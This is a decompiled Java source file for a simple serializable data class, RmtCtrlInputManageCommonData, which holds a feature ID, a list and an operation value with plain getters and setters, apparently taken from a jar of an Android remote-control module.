package com.vvt.remotecontrol.input;

import com.vvt.base.FeatureId;
import java.io.Serializable;
import java.util.List;

public class RmtCtrlInputManageCommonData
  implements Serializable
{
  private static final long serialVersionUID = 411834712555184197L;
  private FeatureId featureId;
  private List list;
  private RmtCtrlInputManageCommonData.Operation operation;
  
  public FeatureId getFeatureId()
  {
    return this.featureId;
  }
  
  public List getList()
  {
    return this.list;
  }
  
  public RmtCtrlInputManageCommonData.Operation getOperation()
  {
    return this.operation;
  }
  
  public void setFeatureId(FeatureId paramFeatureId)
  {
    this.featureId = paramFeatureId;
  }
  
  public void setList(List paramList)
  {
    this.list = paramList;
  }
  
  public void setOperation(RmtCtrlInputManageCommonData.Operation paramOperation)
  {
    this.operation = paramOperation;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecontrol/input/RmtCtrlInputManageCommonData.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */